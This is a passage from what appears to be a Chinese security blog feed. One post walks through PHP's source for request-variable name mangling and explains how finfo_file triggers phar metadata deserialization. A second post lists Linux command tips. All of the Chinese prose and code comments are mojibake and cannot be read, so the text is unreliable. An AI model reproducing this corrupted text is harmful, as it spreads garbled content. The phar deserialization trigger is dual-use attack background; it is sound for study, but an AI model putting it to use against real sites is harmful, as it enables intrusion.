class="hljs-comment">//è¿™é‡Œå¼€å§‹çœŸæ­£æ³¨å†Œå˜é‡äº† æ ‡é‡ç‚¹ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ä¸‹é¢æ”¾å›¾</span><br>&#125;<br>efree(val);<br>next_cookie:<br>var = php_strtok_r(<span class="hljs-literal">NULL</span>, separator, &amp;strtok_buf);<br>&#125;<br><br><span class="hljs-keyword">if</span> (free_buffer) &#123;<br>efree(res);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆä¼šè¿è¡Œ php_register_variable_ex  ä¸Šé¢çš„ ZVAL_NEW_STR æ˜¯æ³¨å†Œå­—ç¬¦ä¸²æ“ä½œ</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111055574.png" alt="image-20220111105528468"></p><p>ç»ˆäºæ¥åˆ°äº†çœŸæ­£äº§ç”Ÿé—®é¢˜çš„åœ°æ–¹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">PHPAPI <span class="hljs-keyword">void</span> <span class="hljs-title">php_register_variable_ex</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *var_name, zval *val, zval *track_vars_array)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> *p = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span> *ip = <span class="hljs-literal">NULL</span>;<span class="hljs-comment">/* index pointer */</span><br><span class="hljs-keyword">char</span> *index;<br><span class="hljs-keyword">char</span> *var, *var_orig;<br><span class="hljs-keyword">size_t</span> var_len, index_len;<br>zval gpc_element, *gpc_element_p;<br>zend_bool is_array = <span class="hljs-number">0</span>;<br>HashTable *symtable1 = <span class="hljs-literal">NULL</span>;<br>ALLOCA_FLAG(use_heap)<br><br>assert(var_name != <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (track_vars_array &amp;&amp; Z_TYPE_P(track_vars_array) == IS_ARRAY) &#123;<br>symtable1 = Z_ARRVAL_P(track_vars_array);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!symtable1) &#123;<br><span class="hljs-comment">/* Nothing to do */</span><br>zval_ptr_dtor_nogc(val);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><br><span class="hljs-comment">/* ignore leading spaces in the variable name */</span><br><span class="hljs-keyword">while</span> (*var_name==<span class="hljs-string">&#x27; &#x27;</span>) &#123;<br>var_name++;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Prepare variable name</span><br><span class="hljs-comment"> */</span><br>var_len = <span class="hljs-built_in">strlen</span>(var_name);<br>var = var_orig = do_alloca(var_len + <span class="hljs-number">1</span>, use_heap); <span class="hljs-comment">//ä¼ å€¼</span><br><span class="hljs-built_in">memcpy</span>(var_orig, var_name, var_len + <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">/* ensure that we don&#x27;t have spaces or dots in the variable name (not binary safe) */</span><br><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//ç©ºæ ¼ å’Œ ç‚¹ ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿ </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//å¦‚æœå˜é‡çš„æ•°ç»„å­˜åœ¨ [ ä¼šè¢«è®¤ä¸ºæ˜¯arrayå‹çš„å˜é‡</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>var_len = p - var;<br><br><span class="hljs-keyword">if</span> (var_len==<span class="hljs-number">0</span>) &#123; <span class="hljs-comment">/* empty variable name, or variable name with a space in it */</span><br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp; EG(current_execute_data)) &#123;<br>zend_execute_data *ex = EG(current_execute_data);<br><br><span class="hljs-keyword">while</span> (ex) &#123;<br><span class="hljs-keyword">if</span> (ex-&gt;func &amp;&amp; ZEND_USER_CODE(ex-&gt;func-&gt;common.type)) &#123;<br><span class="hljs-keyword">if</span> ((ZEND_CALL_INFO(ex) &amp; ZEND_CALL_HAS_SYMBOL_TABLE)<br>&amp;&amp; ex-&gt;symbol_table == symtable1) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;this&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;this&quot;</span>)<span class="hljs-number">-1</span>) == <span class="hljs-number">0</span>) &#123;<br>zend_throw_error(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Cannot re-assign $this&quot;</span>);<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ex = ex-&gt;prev_execute_data;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/* GLOBALS hijack attempt, reject parameter */</span><br><span class="hljs-keyword">if</span> (symtable1 == &amp;EG(symbol_table) &amp;&amp;<br>var_len == <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span> &amp;&amp;<br>!<span class="hljs-built_in">memcmp</span>(var, <span class="hljs-string">&quot;GLOBALS&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;GLOBALS&quot;</span>)<span class="hljs-number">-1</span>)) &#123;<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>index = var;<br>index_len = var_len;<br><br><span class="hljs-keyword">if</span> (is_array) &#123;<br><span class="hljs-keyword">int</span> nest_level = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">char</span> *index_s;<br><span class="hljs-keyword">size_t</span> new_idx_len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span>(++nest_level &gt; PG(max_input_nesting_level)) &#123;<br>HashTable *ht;<br><span class="hljs-comment">/* too many levels of nesting */</span><br><br><span class="hljs-keyword">if</span> (track_vars_array) &#123;<br>ht = Z_ARRVAL_P(track_vars_array);<br>zend_symtable_str_del(ht, var, var_len);<br>&#125;<br><br>zval_ptr_dtor_nogc(val);<br><br><span class="hljs-comment">/* do not output the error message to the screen,</span><br><span class="hljs-comment"> this helps us to to avoid &quot;information disclosure&quot; */</span><br><span class="hljs-keyword">if</span> (!PG(display_errors)) &#123;<br>php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Input variable nesting level exceeded &quot;</span> ZEND_LONG_FMT <span class="hljs-string">&quot;. To increase the limit change max_input_nesting_level in php.ini.&quot;</span>, PG(max_input_nesting_level));<br>&#125;<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;       <span class="hljs-comment">//è¿™é‡Œå°±æ˜¯&#x27;[&#x27;è¢«æ›¿æ¢æˆ&#x27;_&#x27;çš„åŸå› äº† åœ¨å¤„ç†æ•°ç»„çš„é€»è¾‘ä¸­å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„ &#x27;[&#x27;å°± æ›¿æ¢ä¸º &#x27;_&#x27;</span><br><br>index_len = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (index) &#123;<br>index_len = <span class="hljs-built_in">strlen</span>(index);<br>&#125;<br><span class="hljs-keyword">goto</span> plain_var;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>*ip = <span class="hljs-number">0</span>;<br>new_idx_len = <span class="hljs-built_in">strlen</span>(index_s);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!index) &#123;<br>array_init(&amp;gpc_element);<br><span class="hljs-keyword">if</span> ((gpc_element_p = zend_hash_next_index_insert(symtable1, &amp;gpc_element)) == <span class="hljs-literal">NULL</span>) &#123;<br>zend_array_destroy(Z_ARR(gpc_element));<br>zval_ptr_dtor_nogc(val);<br>free_alloca(var_orig, use_heap);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>gpc_element_p = zend_symtable_str_find(symtable1, index, index_len);<br><span class="hljs-keyword">if</span> (!gpc_element_p) &#123;<br>zval tmp;<br>array_init(&amp;tmp);<br>gpc_element_p = zend_symtable_str_update_ind(symtable1, index, index_len, &amp;tmp);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) == IS_INDIRECT) &#123;<br>gpc_element_p = Z_INDIRECT_P(gpc_element_p);<br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) != IS_ARRAY) &#123;<br>zval_ptr_dtor_nogc(gpc_element_p);<br>array_init(gpc_element_p);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>SEPARATE_ARRAY(gpc_element_p);<br>&#125;<br>&#125;<br>&#125;<br>symtable1 = Z_ARRVAL_P(gpc_element_p);<br><span class="hljs-comment">/* ip pointed to the &#x27;[&#x27; character, now obtain the key */</span><br>index = index_s;<br>index_len = new_idx_len;<br><br>ip++;<br><span class="hljs-keyword">if</span> (*ip == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>is_array = <span class="hljs-number">1</span>;<br>*ip = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">goto</span> plain_var;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹å§</p><p>å¯¹äº â€˜ â€˜ å’Œ  â€˜.â€™ æˆå› åœ¨äº,ç®—æ˜¯éšæ€§çš„PHPç‰¹æ€§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//ç©ºæ ¼ å’Œ ç‚¹ ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿ </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//å¦‚æœå˜é‡çš„æ•°ç»„å­˜åœ¨ [ ä¼šè¢«è®¤ä¸ºæ˜¯arrayå‹çš„å˜é‡</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºâ€™[â€˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//ç©ºæ ¼ å’Œ ç‚¹ ä¼šè¢«æ›¿æ¢æˆä¸‹åˆ’çº¿ </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//å¦‚æœå˜é‡çš„æ•°ç»„å­˜åœ¨ [ ä¼šè¢«è®¤ä¸ºæ˜¯arrayå‹çš„å˜é‡</span><br>is_array = <span class="hljs-number">1</span>;   <span class="hljs-comment">//æ•°ç»„æ ‡å¿—ä½</span><br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (is_array) &#123;<br>...<br>           ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;  <span class="hljs-comment">//è¿™é‡Œå°±æ˜¯&#x27;[&#x27;è¢«æ›¿æ¢æˆ&#x27;_&#x27;çš„åŸå› äº† åœ¨å¤„ç†æ•°ç»„çš„é€»è¾‘ä¸­å¦‚æœæ‰¾ä¸åˆ°å¯¹åº”çš„ &#x27;[&#x27;å°± æ›¿æ¢ä¸º &#x27;_&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="å¯ååºåˆ—åŒ–å‡½æ•°æˆå› "><a href="#å¯ååºåˆ—åŒ–å‡½æ•°æˆå› " class="headerlink" title="å¯ååºåˆ—åŒ–å‡½æ•°æˆå› "></a>å¯ååºåˆ—åŒ–å‡½æ•°æˆå› </h3><p>pharååºåˆ—åŒ–è§¦å‘å‡½æ•°<code>finfo_file/finfo_buffer/mime_content_type</code></p><p>åšé¢˜é‡åˆ°çš„ ç¨å¾®çœ‹çœ‹è¿™é‡Œåªçœ‹finfo_fileè¿™ä¸ªå‡½æ•°</p><p>é¦–å…ˆçœ‹çœ‹ä¸ºä»€ä¹ˆpharå¯ä»¥ç”¨æ¥åšååºåˆ—åŒ–ï¼Œåœ¨<code>/ext/phar/phar.c#line618</code>å¤„pharåœ¨å¤„ç†å…ƒæ•°æ®(metadata)æ—¶è°ƒç”¨äº†ååºåˆ—åŒ–å‡½æ•°ï¼Œå¦‚å›¾</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149335.png" alt="image-20220111114936225">ç„¶åæ¥çœ‹çœ‹ finfo_file æ˜¯å¦‚ä½•è§¦å‘ååºåˆ—åŒ–çš„</p><p>è¿½è¸ªåˆ° <code>/ext/fileinfo/fileinfo.c#line600</code> å‘ç°äº† finfo_fileå…·ä½“å®ç°çš„å‡½æ•°_php_finfo_get_type</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149947.png" alt="image-20220111114944892"></p><p>è·Ÿè¿› _php_finfo_get_type #line432å¤„ï¼Œå‘ç°_php_finfo_get_type çš„å®ç°æ–¹æ³•</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150269.png" alt="image-20220111115006179"></p><p>line553 å‘ç°è¿™é‡Œæœ‰æ‰“å¼€æ–‡ä»¶æµçš„æ“ä½œï¼Œä¸”è¿™è¡Œä»£ç ä¸€å®šä¼šæ‰§è¡Œä¸€éã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯php_streamç³»åˆ—çš„APIï¼Œå¯ä»¥ä½¿ç”¨stream_get_wrapperçœ‹åˆ°ç³»ç»Ÿå†…æ³¨å†Œäº†å“ªä¸€äº›wrapper</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150601.png" alt="image-20220111115022534"></p><p>å‘ç°äº†phar å› æ­¤æˆ‘ä»¬ç†è§£äº† finfo_fileæˆä¸º pharååºåˆ—åŒ–å½±å“å‡½æ•°çš„åŸå› ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxæ—¥å¸¸å°æŠ€å·§</title>
    <link href="/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linuxæ—¥å¸¸ä½¿ç”¨å°æŠ€å·§"><a href="#Linuxæ—¥å¸¸ä½¿ç”¨å°æŠ€å·§" class="headerlink" title="Linuxæ—¥å¸¸ä½¿ç”¨å°æŠ€å·§"></a>Linuxæ—¥å¸¸ä½¿ç”¨å°æŠ€å·§</h1><h2 id="å®šä¹‰ä½ çš„ç¯å¢ƒå˜é‡"><a href="#å®šä¹‰ä½ çš„ç¯å¢ƒå˜é‡" class="headerlink" title="å®šä¹‰ä½ çš„ç¯å¢ƒå˜é‡"></a>å®šä¹‰ä½ çš„ç¯å¢ƒå˜é‡</h2><p>åŸºç¡€ç”¨æ³•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">export var_name=var_value<br></code></pre></td></tr></table></figure><p>æ°¸ä¹…ç”Ÿæ•ˆä½ çš„ç¯å¢ƒå˜é‡</p><p>æŠŠç”Ÿæˆç¯å¢ƒå˜é‡çš„è¯­å¥ï¼Œæ”¾åˆ°ä¸€ä¸‹ä»»æ„ä¸€æ–‡ä»¶ä¸­</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/etc/profile<br>/etc/profile.d/*.sh<br>/etc/bashrc<br></code></pre></td></tr></table></figure><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;export var_name=var_value&quot; &gt;&gt; /root/.bashrc\<br>source !$    #è¿™ä¸ªæ—¶å€™é‡æ–°å¼€ä¸€ä¸ªshell echo $var_name å°±å¯ä»¥å‘ç°æˆ‘ä»¬çš„åˆšåˆšæ°¸ä¹…ç”Ÿæ•ˆäº†<br></code></pre></td></tr></table></figure><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><blockquote><p>nohupå‘½ä»¤ å¯ä»¥å°†ç¨‹åºä»¥å¿½ç•¥æŒ‚èµ·ä¿¡å·çš„æ–¹å¼è¿è¡Œèµ·æ¥ï¼Œè¢«è¿è¡Œçš„ç¨‹åºçš„è¾“å‡ºä¿¡æ¯å°†ä¸ä¼šæ˜¾ç¤ºåˆ°ç»ˆç«¯</p></blockquote><p>è¿™ä¸ªå‘½ä»¤å¸¸å¸¸ä¸ &amp; ç›¸ç»“åˆ</p><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ping www.baidu.com &amp;  #æ³¨æ„æˆ‘ä»¬ä¸è¦åªä¼šç§»åŠ¨åˆ°åå°æ‰§è¡Œï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç»“æŸ<br><span class="hljs-meta">#</span><span class="bash">ä¸‹é¢ç»™ä¸€ä¸ªæ ·ä¾‹</span><br><span class="hljs-meta">#</span><span class="bash">åˆ©ç”¨ <span class="hljs-built_in">jobs</span> å‘½ä»¤æŸ¥çœ‹åå°è¿›ç¨‹ï¼Œç„¶åä½¿ç”¨<span class="hljs-built_in">fg</span>å‘½ä»¤å°†åå°è¿è¡Œçš„æˆ–æŒ‚èµ·çš„ä»»åŠ¡ï¼ˆæˆ–ä½œä¸šï¼‰åˆ‡æ¢åˆ°å‰å°è¿è¡Œ</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091033363.png" alt="image-20220109103321273"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><blockquote><p>ç”¨æ¥æ¢æµ‹ç»™å®šæ–‡ä»¶çš„ç±»å‹,fileå‘½ä»¤ ç”¨æ¥æ¢æµ‹ç»™å®šæ–‡ä»¶çš„ç±»å‹ã€‚</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">filefilename  #ç”¨äºå¸®åŠ©æˆ‘ä»¬ç¡®å®šæ–‡ä»¶ç±»å‹<br>file /usr/bin/ls  #è§£è¯»å¯æ‰§è¡Œç¨‹åº<br></code></pre></td></tr></table></figure><h3 id="fgrep"><a href="#fgrep" class="headerlink" title="fgrep"></a>fgrep</h3><blockquote><p>æœç´¢æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²ï¼Œåªæ”¯æŒæœç´¢å­—ç¬¦ä¸²</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">fgrep -i flag 1  #åœ¨1è¿™ä¸ªæ–‡ä»¶ä¸­æœç´¢å«æœ‰flagçš„å­—ç¬¦ä¸²<br>è¿”å›ç»“æœï¼š<br>root@VM-24-13-debian:~# fgrep -i flag 1<br>flag&#123;This_is_test&#125;<br>ASFLAG<br></code></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><blockquote><p>åˆ—å‡ºç›®å‰ä¸è¿‡å»ç™»å…¥ç³»ç»Ÿçš„ç”¨æˆ·ç›¸å…³ä¿¡æ¯</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">last</span> -<span class="hljs-keyword">a</span>:    <span class="hljs-comment">#æŠŠä»ä½•å¤„ç™»å…¥ç³»ç»Ÿçš„ä¸»æœºåç§°æˆ–ipåœ°å€ï¼Œæ˜¾ç¤ºåœ¨æœ€åä¸€è¡Œ</span><br><span class="hljs-keyword">last</span> -n    <span class="hljs-comment">#(numberä¸æ˜¯å­—æ¯5)</span><br><span class="hljs-keyword">last</span> -F    <span class="hljs-comment">#å°½å¯èƒ½è¯¦ç»†çš„è¯´æ˜æ—¶é—´ä¿¡æ¯</span><br><span class="hljs-keyword">last</span> root <span class="hljs-comment"># æ˜¾ç¤ºrootä¹‹å‰ç™»å½•çš„ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><blockquote><p>åˆ—å‡ºç™»å…¥ç³»ç»Ÿå¤±è´¥çš„ç”¨æˆ·ç›¸å…³ä¿¡æ¯ï¼Œä½ ä¹Ÿè®¸å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è·å¾—æ”»å‡»è€…çš„ä¿¡æ¯</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">lastb -a  